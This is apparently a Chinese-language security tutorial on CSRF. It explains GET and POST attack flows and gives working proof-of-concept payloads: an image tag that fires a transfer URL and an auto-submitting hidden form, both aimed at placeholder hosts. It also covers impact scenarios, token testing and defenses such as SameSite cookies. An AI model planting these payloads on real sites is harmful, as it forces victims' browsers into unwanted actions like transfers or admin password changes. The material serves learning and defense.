### 简介

Cross-Site Request Forgery(CSRF)，跨站请求伪造攻击。

缩写为 CSRF/XSRF，也被称为one click attack/session riding

### 原理

"借刀杀人"

CSRF通过构造get/post等请求，设法使已登录用户victim不知情的情况下，以受害者victim的身份发出"非其主观意愿的"HTTP请求。

* CSRF局限性:利用单一的CSRF漏洞能发起HTTP请求，但攻击者无法得到该HTTP请求的内容(Cookie可用但无法查看)，也无法得到任何回显(HTTP响应等)
* CSRF扩展性:可联合其他漏洞(如XSS)进行攻击效果最大化

### CSRF类型 - 发出GET请求

  * 攻击思路 设法让victim的浏览器发出该GET请求
     * 社工诱骗 - 直接 使victim点击构造的url 发出GET请求 `http://get.csrf.com/payto?name=hacker&moneynumb=100`
     * 漏洞联合 - 利用其他漏洞 无交互地利用CSRF漏洞
       * XSS + CSRF 构造并发送GET请求
       * 同源站点的html注入漏洞 发起CSRF(无Referer头)
       * 不同源站点的html注入漏洞
         * 使victim访问攻击者可控的第三方网站`http://3.com`(可注入html代码即可) 从而使victim发出GET请求(Referer头标明了请求发起源站url 如果后端验证Referer则CSRF利用失败)

#### 流程

在 http://www.3.com/demo 中注入以下html代码:
```
<img src="http://get.csrf.com/payto?name=hacker&moneynumb=100">
```

victim访问http://www.3.com/demo 则发出GET请求


get.csrf.com收到GET请求:
请求中的Referer说明了该get请求是从哪个url发起的
```
GET /payto?name=hacker&moneynumb=100 HTTP/1.1
Host: get.csrf.com
Connection: keep-alive
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: http://www.3.com/demo
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
```
       
### CSRF类型 - 发出POST请求

  * 攻击思路 设法让victim的浏览器发出该POST请求
    * 转变为Get更容易攻击 (可尝试将post请求改成get形式的请求 如果可以正常响应 则可以使用get请求进行csrf攻击)
    * 漏洞联合 - 无交互地利用CSRF漏洞
      * XSS + CSRF  构造并发送该POST请求
      * 同源站点的html注入漏洞 发起CSRF(无Referer头)
      * 不同源站点的html注入漏洞
        * 使victim访问攻击者可控的第三方网站`https://3.com`(可注入html代码即可) 从而使victim发出POST请求(Referer头标明了请求发起源站url 如果后端验证Referer则CSRF利用失败)

#### 流程

在 https://3.com 中注入以下html代码:
```
  <script>history.pushState('', '', '/')</script>
    <form name="frm" action="https://post.csrf.com/search" method="POST">
      <input type="hidden" name="ip" value="1&#46;1&#46;1&#46;1" />
      <input type="hidden" name="offset" value="0" />
      <input type="hidden" name="limit" value="20" />
      <input type="submit" value="Submit request" />
    </form>
<script>document.frm.submit()</script>
```

victim访问https://3.com 则发出POST请求


post.csrf.com收到POST请求:
可从Origin看出HTTP请求发起自https://3.com
```
POST /search HTTP/1.1
Host: post.csrf.com
Connection: keep-alive
Content-Length: 28
Cache-Control: max-age=0
Origin: https://3.com
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: https://cn.bing.com/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8

ip=1.1.1.1&offset=0&limit=20
```

### 漏洞影响

* 主要攻击场景(针对没有CSRF防御机制的网站)
  * 利用victim的身份进行操作
    * 修改管理员密码 - 使管理员点击构造的链接 即可修改其密码
    * 新建管理员账号 - 使管理员点击构造的链接 即可新增管理员
  * 漏洞联合
    * XSS + CSRF
      * 社交站点蠕虫 - 如果"向好友发送消息"的HTTP请求中没有设置CSRF-token请求头 则可结合XSS可构造出XSS+CSRF蠕虫 影响极大
      * 拒绝服务 - 如果XSS能打到管理员后台 且管理员注销动作无CSRF防御机制 则可构造payload使管理员一登录就注销

### 测试

* 相同请求重放 - 即可判断token是否为每次动态生成 仅一次性有效 用后失效
* 完全删除CSRFtoken值令其为空 - 即可判断后端是否验证token是否有效
* 修改CSRFtoken值中一个字符 - 即可判断后端验证机制是否严谨
* HTTP方法由POST转换为GET - 即可判断后端验证机制是否严谨

### SDL - 防御与修复方案

* web框架 - 启动框架中成熟的CSRF防御功能
  * 自定义HTTP请求头(Custom Request Headers)
    * 如使用`X-CSRF-token:xxxx`标明CSRF_TOKEN的值(即使CSRF利用成功发出了携带Cookie的HTTP请求 但后端判断`X-CSRF-token`不存在则拒绝请求)
  * One-time Token
    * 如每次提交表单都包含字段`Token=xxxx`且每次值不同 后端可校验是否正确
* 二次验证 - 安全但影响用户体验(适用于仅对敏感功能处进行防御)
  * CAPTCHA 增加验证码机制
  * 再次输入密码
  * 手机验证码
* Cookie安全 - 后端Set-Cookie使用SameSite属性 (由Google引入的用于缓解CSRF攻击的cookie属性 其值为Strict或Lax)
  * 如`Set-Cookie: JSESSIONID=xxx; SameSite=Strict`则从其他站对目标站web后端发起的http请求(CSRF) 不会携带`JSESSIONID`这一Cookie字段
* (不推荐)通过`Referer/Origin`校验来源域名
  * 缺陷1.只能防御从"不被信任"的域发起的伪造的http请求（如果 **父、子、兄弟域名** 或 **CORS中被信任的域名** 有XSS漏洞 配合构造一个伪造请求 此时referer和Origin的值都是被信任的域 此时“校验来源域名”无法防御）
  * 缺陷2.正常业务如果有302跳转 不携带Origin

参考OWASP [Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.md](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.md)
